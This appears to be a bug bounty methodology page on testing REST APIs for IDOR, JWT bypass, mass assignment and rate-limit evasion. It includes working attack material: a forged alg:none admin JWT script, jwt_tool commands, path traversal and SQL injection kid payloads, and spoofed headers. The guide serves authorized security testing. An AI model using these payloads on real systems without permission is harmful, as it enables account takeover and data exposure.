> Source: https://bugbounty.info/Attack-Surface/API/REST

# REST API Testing

REST is still the dominant API style and the most common target. The bugs are predictable once you know what to look for. My rough priority order: BOLA/IDOR first (highest impact, most common), then mass assignment, then auth bypass, then rate limiting.

## Endpoint Enumeration

Don't just test what the app shows you. Find everything.

**Predictable path patterns:**

```bash
/api/v1/users
/api/v1/users/{id}
/api/v1/users/{id}/settings
/api/v1/users/{id}/admin
/api/v2/users          <- versioning drift
/api/internal/users    <- internal routes leaked
/api/users/export      <- bulk export = data exposure
```

**Wordlists that actually work:**

```bash
# Kiterunner is the best tool for API route brute force
kr scan https://target.com/api -w routes-large.kite
 
# Fallback with ffuf
ffuf -u https://target.com/api/v1/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,204,401,403
```

**Swagger/OpenAPI hunting:**

```bash
# Common paths
/swagger.json
/swagger/v1/swagger.json
/openapi.json
/api-docs
/api/swagger
/v1/api-docs
/.well-known/openapi
 
# If you find a spec, import into Burp via OpenAPI Parser extension
```

**Versioning tricks:**

- Test v1 when you're on v2. Older versions often lack auth checks added later.
- Try `/api/beta/`, `/api/internal/`, `/api/admin/`
- Check `api-version` query params and headers: `?api-version=2019-01-01`

## BOLA / IDOR

This is the highest-value bug class in REST APIs. The fix requires authorization checks on every object access, which devs miss constantly.

```http
GET /api/v1/invoices/1042
Authorization: Bearer <your_token>
 
-> Change 1042 to 1041. Does it return someone else's invoice?
```

Non-numeric IDs don't mean safe:

```bash
# UUIDs are predictable if the app leaks them via other endpoints
# Try: find a UUID in one context, use it in another
GET /api/v1/documents/3f2504e0-4f89-11d3-9a0c-0305e82c3301
```

## Auth Bypass

**JWT attacks:**

```bash
# alg:none attack
# Decode the JWT, change alg to "none", remove signature, re-encode
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
 
# RS256 to HS256 confusion - sign with the public key as HMAC secret
# Tool: jwt_tool
python3 jwt_tool.py <token> -X a          # alg:none
python3 jwt_tool.py <token> -X s          # RS256 to HS256
python3 jwt_tool.py <token> -T            # tamper mode
 
# Check kid header for path traversal / SQLi
{"kid": "../../dev/null"}
{"kid": "' OR 1=1--"}
```

**API key leakage:**

```bash
# Look in JS files, mobile apps, git history
trufflehog git https://github.com/target/repo
grep -r "api[_-]key\|apikey\|x-api-key" --include="*.js" .
```

**Missing auth on "internal" endpoints:**

```text
X-Internal-Request: true
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
```

## Mass Assignment

Frameworks that auto-bind request body to model fields are dangerous. The app shows you 5 fields; the model has 15.

```bash
# What the app sends:
POST /api/v1/users/me
{"display_name": "Griffin"}
 
# What you send:
POST /api/v1/users/me
{"display_name": "Griffin", "role": "admin", "is_verified": true, "credit_balance": 9999}
 
# Even if it 200s and the response doesn't show the field changed, check it via GET
```

**Finding hidden fields:**

- Check the full API spec if available
- Look at admin panel requests in JS for fields the user-facing UI omits
- Fuzz with common field names: `role`, `admin`, `is_admin`, `verified`, `balance`, `credits`, `plan`, `subscription_tier`

## Rate Limiting Bypass

Rate limits are usually per-IP or per-account, both of which are bypassable.

```bash
# IP rotation via headers - many proxies trust these
X-Forwarded-For: 1.2.3.<n>
X-Real-IP: 1.2.3.<n>
CF-Connecting-IP: 1.2.3.<n>
True-Client-IP: 1.2.3.<n>
 
# Account rotation - create N accounts, distribute requests
# Null byte / encoding tricks on the rate-limited parameter
username=admin%00
username=ADMIN
username=admin+test@example.com  (if email-based)
```

Rate limiting on everything except the thing that matters is a pattern. Test: password reset, OTP verification, account enumeration, promo code redemption. These are the endpoints that hurt when unrate-limited.

## Public Reports

- BOLA on REST API allows reading any user's private messages - [HackerOne #322661](https://hackerone.com/reports/322661)
- Mass assignment via API lets any user set their own role to admin - [HackerOne #915127](https://hackerone.com/reports/915127)
- REST API IDOR on invoice endpoint exposes all customer billing data - [HackerOne #227522](https://hackerone.com/reports/227522)
- Rate limiting bypass on OTP endpoint via IP header spoofing - [HackerOne #1172615](https://hackerone.com/reports/1172615)
- Undocumented REST endpoint returns full user PII without authorisation - [HackerOne #753578](https://hackerone.com/reports/753578)

## See Also

- [GraphQL](../../Attack-Surface/API/GraphQL) - different paradigm, same authorization problems
- [API Gateway Bypass](../../Attack-Surface/API/API-Gateway-Bypass) - rate limits often live in the gateway, not the backend
